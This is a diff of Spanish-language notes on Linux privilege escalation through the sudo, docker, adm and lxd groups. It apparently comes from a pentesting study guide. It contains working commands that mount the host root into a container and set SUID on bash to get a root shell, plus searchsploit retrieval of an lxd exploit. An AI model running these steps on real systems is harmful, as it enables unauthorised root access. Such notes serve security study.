@@ -11,32 +11,58 @@ Por ejemplo, si un usuario tiene acceso al grupo ‘**docker**‘, podría utili
 Para mitigar el riesgo de abuso de grupos de usuario especiales, es importante limitar cuidadosamente el acceso a estos grupos y asegurarse de que sólo se asignan a usuarios confiables que realmente necesitan acceder a ellos.
 
 
-## Grupos Especiales 
+# Grupos Especiales 
 
 ```bash 
-❯ id                     # Para ver a que grupos estamos asignados 
+❯ id       # Mirar grupos  
+```
 
-# Grupos especiales: 
-# sudo = Si estas en estre grupo y disponemos de la passwd del usuario, podemos ejecutar comandos como el usuario 'root'
+## Sudo
 
+```bash 
+sudo = Si estas en estre grupo y disponemos de la passwd del usuario, podemos ejecutar comandos como el usuario 'root'
+```
 
-# docker = Si estas en este grupo puedes usar los sig. comandos (docker images, docker ps, docker pull ubuntu:latest)
-❯ docker run --rm -dit -v /:/mnt/root --name privesc ubuntu # Desplegaremos un contenedor con una montura de la raiz actual y que la monte en el dir /mnt/root del contenedor
+## Docker
 
-❯ docker exec -it privesc bash # Para ingresar al contenedor y que nos de una bash para poder ver todos los recursos  
-❯ chmod u+s bash               # Dentro del contenedor podemos asignar SUID a la bash y este sera reflejada a la bash legitima del usuario fuera del contenedor ya que como hicimos una copia de la raiz del usuario legitimo, todo lo que hagamos dentro del contenedor sera reflejado afuera de el
+```bash 
+docker = Si estas en este grupo puedes usar los siguientes comandos:
+❯ docker images                # Mirar las imagenes existentes 
+❯ docker ps -a                 # Mirar los contenedores que se estan ejecutando
+❯ docker pull ubuntu:latest    # Descargar una imagen 
+
+# Desplegar un contenedor con una montura de la raiz actual en el dir /mnt/root del contenedor
+❯ docker run --rm -dit -v /:/mnt/root --name <Container_name> <image_name> 
+	# image_name = Imagen del SO a usar 
+	# Container_name = Nombre que se le coloca al contenedor 
+
+# Ingresar al contenedor con una bash para ver todos los recursos  
+❯ docker ps    # Mirar que tipo de bash es permitida 'sh, bash' 
+❯ docker exec -it <Container_name> bash  
+
+# Dentro del contenedor asignar unas bash SUID la cual será reflejada a la legitima del usuario fuera del contenedor ya que todo lo que se hace dentro es reflejado fuera de él
+❯ cd /mnt/root/usr/bin         # Ir a los archivos originales en la montura 
+❯ chmod u+s bash               # Asignar permisos SUID a bash 
+❯ exit                         # Salir del contenedor 
 ❯ ls -l /bin/bash              # Listar los permisos de la bash 
-❯ bash -p                      # Solicitamos la bash con privilegio temporal fuera del contenedor, ya que es una bash SUID
+❯ bash -p                      # Bash con privilegios 
+```
 
+## Adm 
 
-# adm = Si estas en este grupo, podras leer los logs del sistema
+```bash
+adm   # Si estas en este grupo, podras leer los logs del sistema
+
 ❯ ls -l /var/log/
 ❯ cat /var/log/apache2/access.log
+```
 
+## Lxd
 
-# lxd = Si estas en este grupo, puedes escalar por medio de monturas, utilizando el exploit 
+```bash 
+lxd = Si estas en este grupo, puedes escalar por medio de monturas, utilizando el exploit 
+
 ❯ gpasswd -d <user> lxd   # Borrar el grupo lxd de la maquina  
-	
 ❯ searchsploit lxd
 ❯ searchsploit -m 46978.sh 
 # Descargas la imagen de Alpine, la url esta dentro del script 
